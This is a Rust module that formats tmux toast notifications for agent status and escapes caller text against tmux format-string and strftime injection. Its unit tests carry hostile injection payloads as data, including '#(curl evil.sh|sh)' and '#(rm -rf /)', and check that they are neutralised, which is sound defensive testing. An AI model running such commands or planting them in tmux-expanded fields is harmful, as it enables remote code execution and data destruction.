//! `[ui.toast] delivery = "herdr"`: in-tmux toast text and its delivery via
//! `display-message`.

use super::{Class, strip_ascii_control};
use crate::tmux::Tmux;

/// `detail` is truncated to this many *characters* (not bytes) before the toast is
/// built; a single `…` is appended in place of whatever was cut.
pub(super) const MAX_DETAIL_CHARS: usize = 60;

/// Builds the exact `display-message` text for a `herdr`-delivery toast:
///
/// ```text
/// #[fg=yellow,bold]⏸ blocked#[default] <kind-or-name> · <location> · <detail>  #[fg=brightblack]prefix+<key> next up#[default]
/// ```
///
/// for [`Class::Request`], and the same shape with `#[fg=green,bold]✓ done#[default]`
/// for [`Class::Done`]. `detail` has control characters (`0x00`-`0x1F`, `0x7F`)
/// stripped, is then truncated to 60 characters (appending `…` when cut), and only then
/// tmux-escaped (see [`escape_format`]) — escaping happens last so truncation can never
/// split an escaped pair in two. `kind_or_name`, `location` and `key_hint` are *not*
/// truncated, but every one of them — like `detail` — is passed through
/// [`escape_format`] before being interpolated: none of them is a literal this crate
/// controls. `kind_or_name`/`location` in particular are attacker-influenceable at
/// runtime (`@agent_display`/`@agent_name` via `taw pane report-metadata`/`taw agent
/// rename`/`taw pane report-agent --agent`, a tmux session name via plain
/// `rename-session`, or the `title` of a pane-less `taw notification show <title>`
/// recovered by `super::split_title`'s fallback) — tmux expands this whole string as a
/// *format* (`#{...}`/`#(...)` shell substitution, plus a `strftime` pass), so an
/// unescaped `#(...)` in any of them would otherwise run an arbitrary shell command the
/// moment the toast is shown. Only the literal style tokens this function itself writes
/// (`#[fg=...]`, `#[default]`) are exempt — they are never derived from caller input.
///
/// A `detail` with nothing visible in it (empty, or only spaces and control characters)
/// leaves out its ` · <detail>` part, so the toast ends after the location, then the two
/// spaces and the hint, instead of on a separator with nothing after it.
pub fn format_message(
    class: Class,
    kind_or_name: &str,
    location: &str,
    detail: &str,
    key_hint: &str,
) -> String {
    let (style, icon, label) = match class {
        Class::Request => ("fg=yellow,bold", "\u{23f8}", "blocked"),
        Class::Done => ("fg=green,bold", "\u{2713}", "done"),
    };
    // Every interpolated field goes through `escape_format` — the only text this
    // function does *not* escape is the literal style tokens it writes itself
    // (`#[...]`) below. `detail` is stripped and truncated first, same as before; the
    // escaping pass runs last for it too, so truncation can never split a doubled pair.
    let kind_or_name = escape_format(kind_or_name);
    let location = escape_format(location);
    let detail = strip_ascii_control(detail);
    // A pane with nothing to say (no matched line, no title) has no detail to show, and
    // its separator goes with it.
    let detail = if detail.trim().is_empty() {
        String::new()
    } else {
        format!(
            " \u{b7} {}",
            escape_format(&truncate_chars(&detail, MAX_DETAIL_CHARS))
        )
    };
    let key_hint = escape_format(key_hint);
    format!(
        "#[{style}]{icon} {label}#[default] {kind_or_name} \u{b7} {location}{detail}  #[fg=brightblack]prefix+{key_hint} next up#[default]"
    )
}

/// The toast for a `notification show <title>` that is *not* about a pane — a manual
/// notification with no agent, no `<session>:<window>` location and no pane to jump to.
/// It renders as a plain bold title and its body, without the lifecycle icon/label
/// ([`format_message`]'s `✓ done`/`⏸ blocked`) or the `prefix+<key> next up` hint, both of
/// which are meaningless here: the title is the user's own text, not an agent name, and
/// there is nowhere to go. `title` and `body` are user-supplied, so both pass through
/// [`escape_format`] — tmux expands this whole string as a format.
///
/// A `body` with nothing visible in it (empty, or only spaces and control characters) is
/// no body, as it is for [`format_message`]'s detail: the toast ends after its title
/// instead of on a separator with nothing after it.
pub fn format_plain_message(title: &str, body: &str) -> String {
    let title = escape_format(title);
    let body = escape_format(body);
    if body.trim().is_empty() {
        format!("#[bold]{title}#[default]")
    } else {
        format!("#[bold]{title}#[default] \u{b7} {body}")
    }
}

/// Truncates `s` to at most `max` *characters* (Unicode scalar values, not bytes),
/// appending `…` in place of anything cut. A no-op when `s` already fits.
pub(super) fn truncate_chars(s: &str, max: usize) -> String {
    if s.chars().count() <= max {
        return s.to_string();
    }
    let mut truncated: String = s.chars().take(max).collect();
    truncated.push('\u{2026}');
    truncated
}

/// Escapes text that tmux will expand, for both of the passes it makes over it:
///
/// * **formats** — a literal `#` must be doubled, or tmux reads what follows as a
///   `#[...]` style directive or a `#{...}`/`#(...)` expansion. `#(...)` in particular
///   *runs a shell command*, so an un-escaped `#` in agent-supplied text is not merely a
///   display glitch.
/// * **`strftime`** — `display-message` (and `pipe-pane`'s command) additionally passes
///   its text through `strftime`, which consumes `%` sequences: an un-escaped `%` in
///   agent text silently turns into a date fragment (`100% done` → `100<newline> done`
///   via `%d`), and `%n`/`%t` inject a newline or tab. Doubling `%` makes `strftime`
///   emit one literal `%`.
///
/// ASCII control characters (`0x00`-`0x1F`, `0x7F`) are stripped first (see
/// [`strip_ascii_control`]) — before either doubling pass, so a control character can
/// never end up wedged between the two characters of a doubled pair. `#` is then
/// doubled before `%` is, and neither replacement introduces the other's character, so
/// the two passes cannot interfere.
///
/// This is the single choke point every field this module interpolates into a tmux
/// format string must pass through — see [`format_message`]'s doc comment for why none
/// of its four caller-supplied parameters may skip it.
fn escape_format(s: &str) -> String {
    strip_ascii_control(s).replace('#', "##").replace('%', "%%")
}

/// `display-message -c <client_name> <text>` for every attached client
/// (`Tmux::list_clients`). Zero attached clients is a no-op, not an error — there is
/// simply nowhere to show the toast. `text` is trusted to already be safe to embed in a
/// `display-message` call (see [`format_message`]/[`escape_format`]) — this function
/// does no escaping of its own, so every caller must build `text` through
/// `format_message` rather than hand-assembling it.
pub fn show(t: &Tmux, text: &str) -> anyhow::Result<()> {
    for client in t.list_clients()? {
        t.run_ok(&["display-message", "-c", &client.client_name, text])?;
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn request_message_contains_the_blocked_icon_and_label() {
        let text = format_message(Class::Request, "claude", "main:1", "needs input", "O");
        assert!(
            text.contains("#[fg=yellow,bold]\u{23f8} blocked#[default]"),
            "{text}"
        );
        assert!(
            text.contains("claude \u{b7} main:1 \u{b7} needs input"),
            "{text}"
        );
        assert!(
            text.contains("#[fg=brightblack]prefix+O next up#[default]"),
            "{text}"
        );
        assert!(text.ends_with("#[default]"));
    }

    #[test]
    fn done_message_contains_the_done_icon_and_label() {
        let text = format_message(Class::Done, "codex", "main:2", "finished", "O");
        assert!(
            text.contains("#[fg=green,bold]\u{2713} done#[default]"),
            "{text}"
        );
    }

    #[test]
    fn escapes_hash_in_detail_as_doubled_hash() {
        let text = format_message(Class::Done, "claude", "main:1", "PR #482 merged", "O");
        assert!(text.contains("PR ##482 merged"), "{text}");
        assert!(!text.contains("PR #482 merged"), "{text}");
    }

    #[test]
    fn escapes_percent_in_detail_so_strftime_cannot_expand_it() {
        // `display-message` runs its text through strftime as well as the format parser:
        // a bare `%d`/`%n` in agent-supplied text would otherwise become a date fragment
        // or a newline.
        let text = format_message(Class::Done, "claude", "main:1", "100% of 3 %n %d", "O");
        assert!(text.contains("100%% of 3 %%n %%d"), "{text}");
        assert!(!text.contains("100% of"), "{text}");
    }

    #[test]
    fn escapes_hash_and_percent_together_without_interfering() {
        let text = format_message(Class::Request, "claude", "main:1", "#%#", "O");
        // Each character is doubled independently: `#` -> `##`, `%` -> `%%`.
        assert!(
            text.contains("####%%####") || text.contains("##%%##"),
            "{text}"
        );
        let detail_start = text.find("main:1 \u{b7} ").unwrap() + "main:1 \u{b7} ".len();
        let detail = &text[detail_start..];
        assert!(detail.starts_with("##%%##"), "{detail}");
    }

    #[test]
    fn truncates_a_long_detail_to_sixty_chars_plus_ellipsis() {
        let detail = "a".repeat(200);
        let text = format_message(Class::Request, "claude", "main:1", &detail, "O");
        let expected_detail: String = "a".repeat(60) + "\u{2026}";
        assert!(text.contains(&expected_detail), "{text}");
        // Exactly one truncated run of 60 'a's followed by the ellipsis, not 200 of them.
        assert!(!text.contains(&"a".repeat(61)), "{text}");
    }

    #[test]
    fn short_detail_is_not_truncated_or_marked_with_an_ellipsis() {
        let text = format_message(Class::Done, "claude", "main:1", "short", "O");
        assert!(text.contains("short"), "{text}");
        assert!(!text.contains('\u{2026}'), "{text}");
    }

    #[test]
    fn strips_control_characters_from_detail() {
        let text = format_message(Class::Request, "claude", "main:1", "a\x1b[31mb\x07c", "O");
        assert!(text.contains("a[31mbc"), "{text}");
        assert!(!text.contains('\x1b'), "{text}");
        assert!(!text.contains('\x07'), "{text}");
    }

    #[test]
    fn truncation_counts_characters_not_bytes() {
        // Multi-byte characters: 70 'é' (2 bytes each in UTF-8) must still truncate at
        // 60 *characters*, not 60 bytes (which would cut mid-character).
        let detail = "\u{e9}".repeat(70);
        let text = format_message(Class::Done, "claude", "main:1", &detail, "O");
        let expected_detail: String = "\u{e9}".repeat(60) + "\u{2026}";
        assert!(text.contains(&expected_detail), "{text}");
    }

    // --- format-string injection: kind_or_name / location / key_hint --------------
    //
    // Before this fix, only `detail` was escaped; `kind_or_name` (`@agent_display`,
    // `@agent_name`, or a bare `report-agent --agent` value), `location` (a tmux
    // session name via plain `rename-session`), and `key_hint` (the live
    // `@agent-wizard-notification-key` option) were interpolated raw. Any of them
    // containing `#(cmd)` would have made tmux *run `cmd`* the moment the toast was
    // shown (`display-message` expands its whole argument as a format string, which
    // includes `#(...)` shell job substitution), not just display it oddly.

    #[test]
    fn escapes_hash_paren_job_substitution_in_kind_or_name() {
        let text = format_message(
            Class::Request,
            "#(touch /tmp/pwned)",
            "main:1",
            "detail",
            "O",
        );
        assert!(text.contains("##(touch /tmp/pwned)"), "{text}");
        // Anchored on the literal template text immediately before `kind_or_name`, so
        // this cannot spuriously match inside the doubled `##(` above (which itself
        // contains the two-character substring "#(" starting at its second '#').
        assert!(!text.contains("#[default] #(touch"), "{text}");
    }

    #[test]
    fn escapes_percent_strftime_sequence_in_location() {
        let text = format_message(Class::Request, "claude", "%H:%M", "detail", "O");
        assert!(text.contains("%%H:%%M"), "{text}");
        // Anchored on the separator immediately before `location`.
        assert!(!text.contains("\u{b7} %H:%M"), "{text}");
    }

    #[test]
    fn escapes_hash_and_percent_in_key_hint() {
        let text = format_message(Class::Done, "claude", "main:1", "detail", "#(id)%d");
        assert!(text.contains("prefix+##(id)%%d next up"), "{text}");
        assert!(!text.contains("prefix+#(id)"), "{text}");
    }

    #[test]
    fn strips_control_characters_from_kind_or_name_and_location() {
        let text = format_message(Class::Request, "a\x1b[31mb", "c\x07d", "detail", "O");
        assert!(text.contains("a[31mb"), "{text}");
        assert!(text.contains("cd"), "{text}");
        assert!(!text.contains('\x1b'), "{text}");
        assert!(!text.contains('\x07'), "{text}");
    }

    #[test]
    fn rendered_message_has_no_live_job_substitution_regardless_of_which_field_carries_it() {
        // All four caller-supplied fields simultaneously carry a `#(...)` payload.
        // `has_unescaped_hash_paren` below checks the *semantic* property tmux's parser
        // cares about (an odd, i.e. unescaped, run of `#` immediately before `(`) rather
        // than naive substring search, which cannot distinguish "the payload is still
        // escaped" from "the payload leaked through": doubling a lone `#` before `(`
        // always yields a string that, searched naively, still "contains" `#(` as a
        // substring (`##(` contains `#(` starting at its second character).
        let text = format_message(
            Class::Done,
            "#(curl evil.sh|sh)",
            "#(id)",
            "#(whoami)",
            "#(rm -rf /)",
        );
        assert!(
            !has_unescaped_hash_paren(&text),
            "found a live tmux job-substitution sequence: {text}"
        );
        // The payloads are still present in the output, just neutralized.
        assert!(text.contains("##(curl evil.sh|sh)"), "{text}");
        assert!(text.contains("##(id)"), "{text}");
        assert!(text.contains("##(whoami)"), "{text}");
        assert!(text.contains("##(rm -rf /)"), "{text}");
    }

    /// Whether `s` contains a `#(` that tmux's format parser would still treat as live
    /// job substitution: a run of consecutive `#` characters of *odd* length,
    /// immediately followed by `(`. tmux consumes a doubled `##` as one literal `#` and
    /// resumes scanning past it, so only an odd run leaves a final, unescaped `#` free
    /// to start a `#(...)` sequence — this is the reverse of `escape_format`'s doubling,
    /// used here to check its output rather than to trust it blindly.
    fn has_unescaped_hash_paren(s: &str) -> bool {
        let bytes = s.as_bytes();
        let mut i = 0;
        while i < bytes.len() {
            if bytes[i] == b'#' {
                let start = i;
                while i < bytes.len() && bytes[i] == b'#' {
                    i += 1;
                }
                let run = i - start;
                if run % 2 == 1 && bytes.get(i) == Some(&b'(') {
                    return true;
                }
            } else {
                i += 1;
            }
        }
        false
    }

    // --- the toast's wording ----------------------------------------------------------
    //
    // The rule for everything a person reads: no em-dash, en-dash, arrow or curly quote.
    // The toast's separators are the middle dot the rest of the line
    // uses, and its trailing hint says what the key does.

    #[test]
    fn a_toast_holds_no_dash_arrow_or_curly_quote() {
        const BANNED: [(char, &str); 11] = [
            ('\u{2014}', "an em-dash"),
            ('\u{2013}', "an en-dash"),
            ('\u{2192}', "an arrow"),
            ('\u{2018}', "a curly single quote"),
            ('\u{2019}', "a curly single quote"),
            ('\u{201c}', "a curly double quote"),
            ('\u{201d}', "a curly double quote"),
            ('\u{2015}', "a horizontal bar"),
            ('\u{2212}', "a minus sign"),
            ('\u{21d2}', "a double arrow"),
            ('\u{279c}', "an arrow"),
        ];
        let mut toasts = vec![
            format_plain_message("Build finished", "3 warnings"),
            format_plain_message("Heads up", ""),
        ];
        for class in [Class::Request, Class::Done] {
            toasts.push(format_message(
                class,
                "claude",
                "main:1",
                "needs input",
                "O",
            ));
            toasts.push(format_message(class, "codex", "work:0", "", "ctrl-b"));
        }
        for text in toasts {
            for (c, what) in BANNED {
                assert!(!text.contains(c), "{what} in {text}");
            }
        }
    }

    #[test]
    fn the_toast_separates_its_parts_with_a_middle_dot_and_ends_on_next_up() {
        let text = format_message(Class::Done, "codex", "work:0", "finished", "O");
        assert_eq!(
            text,
            "#[fg=green,bold]\u{2713} done#[default] codex \u{b7} work:0 \u{b7} finished  \
             #[fg=brightblack]prefix+O next up#[default]"
        );
    }

    // --- a toast with nothing to say after the location ------------------------------
    //
    // The detail is the first line of what the rule matched, else the pane's title, and a
    // pane can have neither. The toast then ends after its location, as the plain toast
    // ends after its title when it has no body: no separator with nothing after it.

    const DONE_WITH_NO_DETAIL: &str = "#[fg=green,bold]\u{2713} done#[default] codex \u{b7} work:0  \
         #[fg=brightblack]prefix+O next up#[default]";

    #[test]
    fn an_empty_detail_leaves_no_dangling_separator() {
        let text = format_message(Class::Done, "codex", "work:0", "", "O");
        assert_eq!(text, DONE_WITH_NO_DETAIL);
    }

    #[test]
    fn a_detail_with_nothing_visible_in_it_is_an_empty_detail() {
        // Control characters are stripped before anything is drawn, so a detail made only
        // of them is as empty as none, and so is one that is only spaces.
        for detail in [" ", "   ", "\n", "\t \n", "\x07", "\x1b\x07", " \x07 "] {
            assert_eq!(
                format_message(Class::Done, "codex", "work:0", detail, "O"),
                DONE_WITH_NO_DETAIL,
                "the detail {detail:?}"
            );
        }
    }

    #[test]
    fn a_blocked_toast_with_no_detail_ends_the_same_way() {
        let text = format_message(Class::Request, "claude", "main:1", "", "ctrl-b");
        assert_eq!(
            text,
            "#[fg=yellow,bold]\u{23f8} blocked#[default] claude \u{b7} main:1  \
             #[fg=brightblack]prefix+ctrl-b next up#[default]"
        );
    }

    // --- `notification show <title> --body <text>` ---------------------------------
    //
    // A pane-less `Notification` (no `pane_id`) has no agent, no `<session>:<window>`
    // location and no pane to jump to, so `notify::show_toast`'s `herdr` branch renders it
    // through `format_plain_message` — a plain bold title and its body, without the
    // lifecycle icon/label or the jump hint. `title` and `body` come verbatim off the
    // command line, so both are still escaped against tmux's format expansion.

    #[test]
    fn plain_message_is_just_the_title_and_body_with_no_agent_framing() {
        let text = format_plain_message("Build finished", "3 warnings");
        // The title and the body, and between them the one separator the rest of the line
        // uses: no location, so no second one and no empty place for it.
        assert_eq!(
            text, "#[bold]Build finished#[default] \u{b7} 3 warnings",
            "{text}"
        );
        // None of the agent-transition framing that the bug wrongly applied.
        assert!(
            !text.contains("next up"),
            "no hint on a pane-less toast, there is nowhere to go: {text}"
        );
        assert!(!text.contains("done"), "no lifecycle label: {text}");
        assert!(!text.contains("blocked"), "no lifecycle label: {text}");
    }

    #[test]
    fn plain_message_with_no_body_is_just_the_title() {
        let text = format_plain_message("Heads up", "");
        assert_eq!(text, "#[bold]Heads up#[default]");
    }

    #[test]
    fn a_body_with_nothing_visible_in_it_is_no_body() {
        // The rule `format_message` keeps for its detail: control characters are stripped
        // before anything is drawn, so a body made only of them is as empty as none, and so
        // is one that is only spaces.
        for body in [" ", "   ", "\n", "\t \n", "\x07", "\x1b\x07", " \x07 "] {
            assert_eq!(
                format_plain_message("Heads up", body),
                "#[bold]Heads up#[default]",
                "the body {body:?}"
            );
        }
    }

    #[test]
    fn plain_message_escapes_title_and_body() {
        let text = format_plain_message("#(touch /tmp/pwned) \u{b7} evil", "100% #(id) done");
        assert!(
            !has_unescaped_hash_paren(&text),
            "found a live tmux job-substitution sequence: {text}"
        );
        assert!(text.contains("##(touch /tmp/pwned)"), "{text}");
        assert!(text.contains("100%% ##(id) done"), "{text}");
    }
}
